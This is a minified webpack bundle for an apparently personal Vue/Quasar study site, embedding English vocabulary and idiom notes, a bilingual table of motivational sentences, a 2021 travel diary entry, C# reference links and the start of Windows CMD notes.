(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([[2],{"0e36":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},a=[],i=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},s=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("img",{attrs:{src:"img/english/音标/发音组合.png",alt:""}})])}],o={},l=o,c=t("2877"),p=Object(c["a"])(l,i,s,!1,null,"1b5c7dd5",null),u=p.exports,m=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{staticClass:"q-my-md q-mx-sm"},[t("q-markdown",{attrs:{extend:n.extendMarkdown,src:n.MainComponent}})],1)},d=[],g=(t("caad"),t("ac1f"),t("2532"),t("1276"),"\r\n\r\n\r\n\r\n\r\n\r\n| Sunday                                                       | monday                                                       | tuesday | Wednesday                                                    | Thursday                          | Friday | Saturday |\r\n| :----------------------------------------------------------- | ------------------------------------------------------------ | ------- | ------------------------------------------------------------ | --------------------------------- | ------ | -------- |\r\n| Bible<br/>ancient<br/>Jesus<br/>Christian<br/>evil<br/>worthless<br/>they are not valuable<br/>judge<br/>judgment day<br/>heaven<br/>hell<br/>Confucius -- 孔子<br/>Almost 5 years<br/>both eyes<br/>technical<br/>pandemic<br/>usually<br/>weekend<br/>mountain<br/>youtube<br/>badminton--羽毛球<br/>once every 2 weeks | instant noodles  立即的  ，方便面<br/>siesta   --午睡 nap<br/>siesta time<br/>have you ever + past participle verb<br/>have you ever go to SM?<br/>eat - ate - eaten<br/>authentic -真正的<br/>fist fight<br/>convenient<br/>on foot<br/>at the age of 10<br/>From Me to Everyone:  06:21 PM<br/>zoo<br/>From Me to Everyone:  06:42 PM<br/>cheated on<br/>have you ever cheated on an exam?<br/>obvious cheating technique<br/>gone<br/>Catholic University -- 天主教<br/>Christian<br/>uniform<br/>part-time job<br/>CV-简历<br/>résumé--简历<br/>frog<br/>have you ever eaten a frog |         | nap<br/>as usual<br/>musician<br/>new age<br/>genre--种类<br/>nature sounds<br/>the life is tiring<br/>tiring tired<br/>boring and bored<br/>dye - color<br/>bald<br/>anime-日本动漫<br/>trousers<br/>jeans<br/>music taste | personality<br/>instruments--仪器 |        |          |\r\n|                                                              |                                                              |         |                                                              |                                   |        |          |\r\n|                                                              |                                                              |         |                                                              |                                   |        |          |\r\n\r\n"),b={data:function(){return{MainComponent:g,img_prefix:"./img/linux/heima-Linux云计算/讲义/"}},methods:{extendMarkdown:function(n){var r=this;console.log(n.renderer.rules);var t=n.renderer.rules.html_block;n.renderer.rules.html_block=function(n,e,a,i,s){var o=n[e];if(console.log("1"),o.content.includes("<img")){console.log("token-- ",o);var l="";l=o.content;var c=l.split('src="'),p=c[0]+' src="'+r.img_prefix+c[1];o.content=p}return o.attrSet("class","q-markdown--token  "),t(n,e,a,i,s)},n.renderer.rules.image=function(n,t,e,a,i){var s=n[t];console.log("3"),s.attrSet("class","q-markdown--image"),console.log("token--- "+t+"-----",s);var o=s.attrGet("src");return console.log(o),s.attrSet("src",r.img_prefix+o),i.renderToken(n,t,e)}}}},v=b,h=Object(c["a"])(v,m,d,!1,null,"6201dc3e",null),S=h.exports,y=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{staticClass:"q-my-md q-mx-sm"},[t("q-markdown",{attrs:{extend:n.extendMarkdown,src:n.MainComponent}})],1)},f=[],_='\r\n\r\n```\r\nHello guys. Every day, I will send some useful words, phrases, sentences, slang (俚语）, and idioms(成语)here. If you have any questions, message me directly. Happy learning!\r\n\r\nIn English, when we say good night, we also add "Sleep tight!" \r\nSo, good night and sleep tight guys 🤪\r\n\r\nOnce in a blue moon is a 成语(idiom)\r\nIt means, something happens very rarely.\r\nExample: My sister takes a bath once in a blue moon.\r\n\r\nunder the weather is an idiom (成语) \r\nIt means to feel sick.\r\nExample: My student cancelled his class because he is feeling a bit under the weather.\r\n\r\nIn English, we NEVER say "There\'s a BIG rain." Instead, we say "heavy rain" or "It\'s raining cats and dogs!"\r\n\r\nIn slang, salty (咸的) means angry.\r\nExample: My mom was salty because we didn\'t call her.\r\n```\r\n\r\n',x={data:function(){return{MainComponent:_,img_prefix:"./img/linux/heima-Linux云计算/讲义/"}},methods:{extendMarkdown:function(n){var r=this;console.log(n.renderer.rules);var t=n.renderer.rules.html_block;n.renderer.rules.html_block=function(n,e,a,i,s){var o=n[e];if(console.log("1"),o.content.includes("<img")){console.log("token-- ",o);var l="";l=o.content;var c=l.split('src="'),p=c[0]+' src="'+r.img_prefix+c[1];o.content=p}return o.attrSet("class","q-markdown--token  "),t(n,e,a,i,s)},n.renderer.rules.image=function(n,t,e,a,i){var s=n[t];console.log("3"),s.attrSet("class","q-markdown--image"),console.log("token--- "+t+"-----",s);var o=s.attrGet("src");return console.log(o),s.attrSet("src",r.img_prefix+o),i.renderToken(n,t,e)}}}},w=x,E=Object(c["a"])(w,y,f,!1,null,"7e0c7c30",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{staticClass:"q-my-md q-mx-sm"},[t("q-markdown",{attrs:{extend:n.extendMarkdown,src:n.MainComponent}})],1)},C=[],j="| EN                                                           | CH                                                     |\r\n| ------------------------------------------------------------ | ------------------------------------------------------ |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n| Don't judge a  book by its cover.                            | 人不可貌相。                                           |\r\n| Haste makes waste.                                           | 欲速则不达。                                           |\r\n| Don't act in haste or be hot-headed.                         | 别匆忙行事，也别鲁莽。                                 |\r\n| Part of life is learning to let things go.                   | 学会放手是人生的一部分。                               |\r\n| Don't let emotion cloud your judgment.                       | 不要让情绪影响你的判断。                               |\r\n| True friendship is a rare thing.                             | 人生难遇知己。                                         |\r\n| Every problem is an opportunity.                             | 问题即机遇。                                           |\r\n| Chinese soldiers are the most lovable people.                | 中国军人是最可爱的人。                                 |\r\n| There is an answer for everything.                           | 凡事皆有解。                                           |\r\n| Sometimes you gotta get through your fears to see the beauty on the  other side. | 唯有挣脱恐惧的枷锁，才能领略别样的风光。               |\r\n| Don't forget to follow your dreams.                          | 不忘初心，逐梦前行。                                   |\r\n| When things get hard, we are gonna be the ones who hold each other up. | 同舟共济，患难与共。                                   |\r\n| Sometimes things need to fall apart to make way for better things. | 破而后立，晓喻新生。                                   |\r\n| Change is a part of  life .                                  | 世事无常。                                             |\r\n| You're both lucky to have found each other.                  | 此生相逢，何其幸运。                                   |\r\n| Confidence grows with success.                               | 越成功越自信。                                         |\r\n| No one could ever replace you.                               | 你，无可替代。                                         |\r\n| The sun is shining. Birds are chirping.                      | 阳光明媚，鸟鸣啾啾。                                   |\r\n| Letting things happen naturally is the way to go.            | 车到山前必有路。                                       |\r\n| Do everything you can  right now , and then decide.          | 全力以赴，历而后择。                                   |\r\n| Everything happens for a reason.                             | 万事皆有因。                                           |\r\n| Whatever you are doing, keep on doing it.                    | 无论行何事，恒心铸坚持。                               |\r\n| Miracles never cease.                                        | 奇迹总会发生。奇迹永不止息。                           |\r\n| Do the things that make you happy. Life is about feeding your soul. | 去做让你开心的事情。人生就是要满足自己。               |\r\n| There is always hope.                                        | 希望永存。                                             |\r\n| It's even more important that you choose the right side.     | 选择正确很重要。                                       |\r\n| You find the good in everyone. It's a  lovely quality.       | 察人之美，其身也善。                                   |\r\n| To travel is better than to arrive.                          | 路途之美，远甚终点。                                   |\r\n| You are stronger than you believe.                           | 你的能力超乎你的想象。                                 |\r\n| The longest journey begins with a single step.               | 千里之行，始于足下。                                   |\r\n| Out of darkness comes light.                                 | 穿过黑暗，光明自现。                                   |\r\n| It's just that we could be more effective if we coordinated our efforts. | 齐心协力，收效更甚。众人划将开大船。                   |\r\n| I think a man does what he can until his destiny is revealed to him . | 斯人当尽其才至其命已昭。                               |\r\n| Time is a great healer.                                      | 岁月抚平伤痕。                                         |\r\n| Three is  a kindness in you .                                | 你心怀善意。                                           |\r\n| We are so excited about the future.                          | 未来可期。                                             |\r\n| My arms will hold you, keeping you safe and warm.            | 以我之臂，护你周全。                                   |\r\n| I want to make some  new memories. Good memories.            | 我想营造一些回忆，永存美好。                           |\r\n| Belief in  our hearts means strength in our legs.            | 心中有信仰，脚下有力量。                               |\r\n| Sometimes adversity can lead to growth.                      | 逆境让人成长。                                         |\r\n| You reap what  you sow.                                      | 一分耕耘，一分收获。                                   |\r\n| You will never age for me,nor fade,nor die.                  | 你对我而言，无岁月之流逝，无花容之褪色，无人生之别离。 |\r\n| How you live your life is your business.                     | 如何生活，取决于你。                                   |\r\n| Everything is gonna be fine.                                 | 一切都会好起来。                                       |\r\n| Actions speak louder than words.                             | 行胜于言。                                             |\r\n| Don't be so hard on yourself.                                | 别对自己太苛刻。                                       |\r\n| Well begun is half done.                                     | 好的开端是成功的一半。                                 |\r\n| The good challenge makes life worth living.                  | 好的挑战，让生活更有意义。                             |\r\n| Nothing is set in stone.                                     | 万事无绝对。                                           |\r\n| We all have limitaions .We all make mistakes.                | 我们都有自身的局现性，都会犯错。                       |\r\n| The path to success is  not a straight line.                 | 通往成功之路并不是一帆风顺。                           |\r\n| Things have a way of working themselves out.                 | 船到桥头自然直。                                       |\r\n| I've always felt that I learn more from disappointment than I do from success. | 比起成功，我从失望中学到的更多。                       |\r\n| How wonderful life is while you're in the word.              | 世界因你而美好。                                       |\r\n| I figured we can do something a lot bigger together.         | 我想我们可以一起干一番大事。                           |\r\n| Life in not kind . Anguish is inevitable.                    | 生活并非一帆风顺，痛苦在所难免。                       |\r\n| You need to make  yourself indispensable.                    | 你要让自己成为无可替代的人。                           |\r\n| Every time God closes a door ,he opens a window.             | 每次上帝为你关上一扇门，他就会打开一扇窗。             |\r\n| We went through a lot ,but we stayed together.               | 我们历经风雨，依旧团结一心。                           |\r\n| Strong relationships need honesty.                           | 只有坦诚以待，关系才会更加牢固。                       |\r\n| We get to decide what our story is.                          | 我们的故事，由自己书写。                               |\r\n| I blessed the day  I found you.                              | 感谢上天让我遇到你。                                   |\r\n| Remeber ,keep a positive attitude,and good things will happen. | 保持乐观心态，好运自然就来。                           |\r\n| It was up to me to reach for that dream.                     | 我凭着自己的努力去追逐梦想。                           |\r\n| I love being a kid . I have my whole life ahead of me.       | 我喜欢当一个小孩，可以书写大好前程。                   |\r\n| We cherish each moment of our lives.                         | 珍惜生命中的每一刻。                                   |\r\n| Life is too short to be pissed off all the time.             | 人生短暂，不能总是愤世嫉俗。                           |\r\n| There is  always a bright side.                              | 凡事总有美好的一面。                                   |\r\n| Love is  the best medicine.                                  | 爱是世间最好的良药。                                   |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n|                                                              |                                                        |\r\n",M={data:function(){return{MainComponent:j,img_prefix:"./img/linux/heima-Linux云计算/讲义/"}},methods:{extendMarkdown:function(n){var r=this;console.log(n.renderer.rules);var t=n.renderer.rules.html_block;n.renderer.rules.html_block=function(n,e,a,i,s){var o=n[e];if(console.log("1"),o.content.includes("<img")){console.log("token-- ",o);var l="";l=o.content;var c=l.split('src="'),p=c[0]+' src="'+r.img_prefix+c[1];o.content=p}return o.attrSet("class","q-markdown--token  "),t(n,e,a,i,s)},n.renderer.rules.image=function(n,t,e,a,i){var s=n[t];console.log("3"),s.attrSet("class","q-markdown--image"),console.log("token--- "+t+"-----",s);var o=s.attrGet("src");return console.log(o),s.attrSet("src",r.img_prefix+o),i.renderToken(n,t,e)}}}},R=M,L=Object(c["a"])(R,k,C,!1,null,"1c68c450",null),O=L.exports,A=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},I=[],D={},P=D,N=Object(c["a"])(P,A,I,!1,null,"f77492ee",null),q=N.exports,H=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},B=[],F={},U=F,J=Object(c["a"])(U,H,B,!1,null,"5a519dca",null),z=J.exports,W=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},$=[],G={},V=G,Q=Object(c["a"])(V,W,$,!1,null,"305d850b",null),K=Q.exports,X=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Y=[],Z={},nn=Z,rn=Object(c["a"])(nn,X,Y,!1,null,"06696c4c",null),tn=rn.exports,en=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+n.value,label:r+1+"."+n.label}})})),1),t(""+n.tab,{tag:"component"})],1)},an=[],sn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{extend:n.extendMarkdown,src:n.MainComponent}})],1)},on=[],ln="               I want to travel         --------   2021.08.07      \r\n    China has the world's third largest land , area of 9.6 million square kilometers, accounting for about 1/15 of the world's total land area.\r\n    China has 34 provinces, 56 ethnic groups, and lots of foreign tourists and immigrants.\r\n    Each province has its own unique culture. When you travel around China, you can see different landscapes and cultures.\r\n    \r\n    Tibet has the highest mountain in the world and the highest average altitude in the world. \r\n    The Tibetan people are honest, trust nature and live in harmony with nature.\r\n    There are also many Buddhist temples with a long history and culture.\r\n    The sky is very blue and clear and  there are many holy lakes, very clean.\r\n    \r\n    Shenzhen is a young fashionable modern city with advanced science and technology. \r\n    A lot of young people go there to chase their dreams. There are lots of parks. \r\n    Among them Xianhu Botanical Garden and Wutong Mountain park and Binhai Park is the most worth going to.\r\n    \r\n    You can walk through the gate of Wutong Mountain to the Xianhu Botanical Garden, and then go out from the main gate to take the bus and subway home. \r\n    The route, which can be more than 20 kilometers, has beautiful scenery and humid air, making it ideal for hiking.\r\n    Shenzhen Binhai Park contains 12 theme parks and stretches about 11 kilometers along the coast. Opposite is Hong Kong.\r\n    \r\n    I also dreamed of driving a car, or riding a motorcycle, to have a In-depth Travel of China  . \r\n    But my parents are getting older and older, I need to take care of them, and I need to get married and have a family of my own. I need to make plans for my future.\r\n    Besides, traveling is expensive and I never have enough money to travel.\r\n    \r\n    I need to work hard for my dreams.\r\n    \r\n    \r\n\r\n\r\n\r\n​\t               \r\n\r\n",cn={data:function(){return{MainComponent:ln,img_prefix:"./img/linux/heima-Linux云计算/讲义/"}},methods:{extendMarkdown:function(n){var r=this;console.log(n.renderer.rules);var t=n.renderer.rules.html_block;n.renderer.rules.html_block=function(n,e,a,i,s){var o=n[e];if(console.log("1"),o.content.includes("<img")){console.log("token-- ",o);var l="";l=o.content;var c=l.split('src="'),p=c[0]+' src="'+r.img_prefix+c[1];o.content=p}return o.attrSet("class","q-markdown--token  "),t(n,e,a,i,s)},n.renderer.rules.image=function(n,t,e,a,i){var s=n[t];console.log("3"),s.attrSet("class","q-markdown--image"),console.log("token--- "+t+"-----",s);var o=s.attrGet("src");return console.log(o),s.attrSet("src",r.img_prefix+o),i.renderToken(n,t,e)}}}},pn=cn,un=Object(c["a"])(pn,sn,on,!1,null,"41ddd937",null),mn=un.exports,dn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"row  "},[t("q-select",{attrs:{"use-input":"","input-debounce":"0",clearable:"",options:n.book_options},on:{filter:n.filterFn},model:{value:n.book,callback:function(r){n.book=r},expression:"book"}},[t("template",{slot:"before"},[t("div")])],2)],1),t("div",{staticClass:"q-pdfviewer-container   "},[t("q-pdfviewer",{attrs:{src:n.src,type:"html5","content-class":" fit   q-pdfviewer-container","inner-content-class":" fit   q-pdfviewer-container"},model:{value:n.show,callback:function(r){n.show=r},expression:"show"}})],1)])},gn=[],bn=t("1b62"),vn=["/第1阶段-运维基本功（升级7.6版本）/01运维概述与Linux系统安装.pdf","/第1阶段-运维基本功（升级7.6版本）/02Linux基础命令.pdf"],hn="linux/heima-Linux云计算",Sn={mixins:[bn["b"]],data:function(){return{prefix:hn,book_options:vn,show:!0,book:vn[0],src:""}}},yn=Sn,fn=Object(c["a"])(yn,dn,gn,!1,null,null,null),_n=fn.exports,xn={mixins:[bn["a"]],components:{m1:mn,m2:_n},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"note-202108",value:"m1"}]}}},wn=xn,En=Object(c["a"])(wn,en,an,!1,null,"08e87cfa",null),Tn=En.exports,kn={mixins:[bn["a"]],components:{m1:u,m2:S,m3:T,m4:O,m5:q,m6:z,m7:K,m8:tn,m9:Tn},data:function(){return{tab:"m9",tab_level:1,tabs:[{label:"phonetic",value:"m1"},{label:"word",value:"m2"},{label:"phrase",value:"m3"},{label:"sentence",value:"m4"},{label:"diary",value:"m9"}]}}},Cn=kn,jn=Object(c["a"])(Cn,e,a,!1,null,"4b933ce0",null);r["default"]=jn.exports},1651:function(n,r,t){"use strict";var e=t("2512"),a=t.n(e);a.a},"168d":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+n.value,label:r+1+"."+n.label}})})),1),t(""+n.tab,{tag:"component"})],1)},a=[],i=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+n.value,label:r+1+"."+n.label}})})),1),t("m"+n.tab,{tag:"component"})],1)},s=[],o=t("9523"),l=t.n(o),c=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},p=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h4",[n._v("C#有用的网站")]),t("ul",{staticClass:"list"},[t("li",[t("a",{attrs:{target:"_blank",rel:"nofollow",href:"http://msdn.microsoft.com/en-us/library/67ef8sbd.aspx"}},[n._v("C# Programming Guide")]),n._v(" - 介绍了有关关键的 C# 语言特征以及如何通过 .NET 框架访问 C# 的详细信息。")]),t("li",[t("a",{attrs:{target:"_blank",rel:"nofollow",href:"https://visualstudio.microsoft.com/zh-hans/downloads/"}},[n._v("Visual Studio")]),n._v(" - 下载作为 C# 集成开发环境的 Visual Studio 的最新版本。")]),t("li",[t("a",{attrs:{target:"_blank",rel:"nofollow",href:"http://www.mono-project.com/Main_Page"}},[n._v("Go Mono")]),n._v(" - Mono 是一个允许开发人员简单地创建跨平台应用程序的软件平台。")]),t("li",[t("a",{attrs:{target:"_blank",rel:"nofollow",href:"http://en.wikipedia.org/wiki/C_Sharp_(programming_language)"}},[n._v("C Sharp (programming language) ")]),n._v(" - 维基百科解释 C#（编程语言）。")])])])}],u={},m=u,d=t("2877"),g=Object(d["a"])(m,c,p,!1,null,"ee34ceaa",null),b=g.exports,v=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},h=[],S={},y=S,f=Object(d["a"])(y,v,h,!1,null,"1a983f6b",null),_=f.exports,x=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},w=[],E={},T=E,k=Object(d["a"])(T,x,w,!1,null,"d876bb4a",null),C=k.exports,j=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},M=[],R={},L=R,O=Object(d["a"])(L,j,M,!1,null,"69d0899c",null),A=O.exports,I=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},D=[],P={},N=P,q=Object(d["a"])(N,I,D,!1,null,"3fdc70dd",null),H=q.exports,B=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},F=[],U={},J=U,z=Object(d["a"])(J,B,F,!1,null,"15e8581e",null),W=z.exports,$=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},G=[],V={},Q=V,K=Object(d["a"])(Q,$,G,!1,null,"28178142",null),X=K.exports,Y=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Z=[],nn={},rn=nn,tn=Object(d["a"])(rn,Y,Z,!1,null,"7bffb2c0",null),en=tn.exports,an={components:{m1:b,m2:_,m3:C,m4:A,m5:H,m6:W,m7:X,m8:en},data:function(){return l()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{label:"基础",value:"m1"},{label:"C#",value:"m2"},{label:"C#",value:"m3"},{label:"C#",value:"m4"},{label:"C#",value:"m5"},{label:"C#",value:"m6"},{label:"C#",value:"m7"},{label:"C#",value:"m8"}])}},sn=an,on=Object(d["a"])(sn,i,s,!1,null,"1e749cba",null),ln=on.exports,cn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},pn=[],un=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},mn=[],dn={},gn=dn,bn=Object(d["a"])(gn,un,mn,!1,null,"68607f2a",null),vn=bn.exports,hn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},Sn=[],yn={},fn=yn,_n=Object(d["a"])(fn,hn,Sn,!1,null,"442309cb",null),xn=_n.exports,wn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},En=[],Tn={},kn=Tn,Cn=Object(d["a"])(kn,wn,En,!1,null,"9993f80a",null),jn=Cn.exports,Mn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Rn=[],Ln={},On=Ln,An=Object(d["a"])(On,Mn,Rn,!1,null,"ed7c2988",null),In=An.exports,Dn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Pn=[],Nn={},qn=Nn,Hn=Object(d["a"])(qn,Dn,Pn,!1,null,"5f4dd27d",null),Bn=Hn.exports,Fn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Un=[],Jn={},zn=Jn,Wn=Object(d["a"])(zn,Fn,Un,!1,null,"3559b9be",null),$n=Wn.exports,Gn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Vn=[],Qn={},Kn=Qn,Xn=Object(d["a"])(Kn,Gn,Vn,!1,null,"0b65a0ff",null),Yn=Xn.exports,Zn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},nr=[],rr={},tr=rr,er=Object(d["a"])(tr,Zn,nr,!1,null,"3d1cef80",null),ar=er.exports,ir={components:{m1:vn,m2:xn,m3:jn,m4:In,m5:Bn,m6:$n,m7:Yn,m8:ar},data:function(){return l()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},sr=ir,or=Object(d["a"])(sr,cn,pn,!1,null,"75677eba",null),lr=or.exports,cr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},pr=[],ur=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},mr=[],dr={},gr=dr,br=Object(d["a"])(gr,ur,mr,!1,null,"49098ae2",null),vr=br.exports,hr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},Sr=[],yr={},fr=yr,_r=Object(d["a"])(fr,hr,Sr,!1,null,"1bcaa4c3",null),xr=_r.exports,wr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Er=[],Tr={},kr=Tr,Cr=Object(d["a"])(kr,wr,Er,!1,null,"7eb90db3",null),jr=Cr.exports,Mr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Rr=[],Lr={},Or=Lr,Ar=Object(d["a"])(Or,Mr,Rr,!1,null,"54c4f4f4",null),Ir=Ar.exports,Dr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Pr=[],Nr={},qr=Nr,Hr=Object(d["a"])(qr,Dr,Pr,!1,null,"2ad0dc35",null),Br=Hr.exports,Fr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Ur=[],Jr={},zr=Jr,Wr=Object(d["a"])(zr,Fr,Ur,!1,null,"00dcc376",null),$r=Wr.exports,Gr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Vr=[],Qr={},Kr=Qr,Xr=Object(d["a"])(Kr,Gr,Vr,!1,null,"522eaa92",null),Yr=Xr.exports,Zr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},nt=[],rt={},tt=rt,et=Object(d["a"])(tt,Zr,nt,!1,null,"a616dc10",null),at=et.exports,it={components:{m1:vr,m2:xr,m3:jr,m4:Ir,m5:Br,m6:$r,m7:Yr,m8:at},data:function(){return l()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},st=it,ot=Object(d["a"])(st,cr,pr,!1,null,"717108bc",null),lt=ot.exports,ct={components:{C3:ln,other:lr,tool:lt},data:function(){return{tab:"C3",tabs:[{label:"C#",value:"C3"},{label:"添加",value:"other"},{label:"删除",value:"tool"}]}}},pt=ct,ut=Object(d["a"])(pt,e,a,!1,null,"75a8f402",null);r["default"]=ut.exports},"1b62":function(n,r,t){"use strict";t.d(r,"b",(function(){return o})),t.d(r,"a",(function(){return u}));t("4de4"),t("c975");var e=t("448a"),a=t.n(e),i=["/第1阶段-运维基本功（升级7.6版本）/01运维概述与Linux系统安装.pdf","/第1阶段-运维基本功（升级7.6版本）/02Linux基础命令.pdf"],s="linux/heima-Linux云计算",o={name:"Container",data:function(){return{prefix:s,book_options:i,book_options_all:[],show:!0,book:i[0],src:""}},created:function(){this.book_options_all=a()(this.book_options),this.src=this.$utils.compute_book_src(this.prefix+this.book)},watch:{book:function(n,r){n&&this.change_book()}},methods:{change_book:function(){console.log("this.book",this.book),this.src=this.$utils.compute_book_src(this.prefix+this.book)},filterFn:function(n,r){var t=this;r(""!==n?function(){var r=n.toLowerCase();t.book_options=t.book_options_all.filter((function(n){return n.toLowerCase().indexOf(r)>-1}))}:function(){t.book_options=t.book_options_all})}}},l=t("ded3"),c=t.n(l),p=t("2f62"),u={data:function(){return{tab:"",tab_level:1,is_active:!1}},computed:c()({},Object(p["c"])(["get_current_selected_right_menu"])),created:function(){this.is_active=!0,this.fix_right_menu_config()},watch:{tab:function(){this.tab||this.fix_right_menu_config()},get_current_selected_right_menu:function(n,r){this.tab=this.get_current_selected_right_menu["t"+this.tab_level]}},methods:c()(c()({},Object(p["b"])(["set_right_menu_fix_config"])),{},{fix_right_menu_config:function(){this.set_right_menu_fix_config({tl:this.tab_level,tabs:this.tabs||[],tv:this.tab||this.tabs[0]["value"]})}}),beforeDestroy:function(){this.is_active=!1}}},"1c0f":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},a=[],i=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},s=[],o=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},l=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("p",[n._v("\n\nCMD命令：开始－>运行－>键入cmd或command（在命令行里可以看到系统版本、文件系统版本）"),t("br"),n._v("\nchcp 修改默认字符集"),t("br"),n._v("\nchcp 936默认中文"),t("br"),n._v("\nchcp 65001"),t("br"),n._v("\n1. appwiz.cpl：程序和功能\n2. 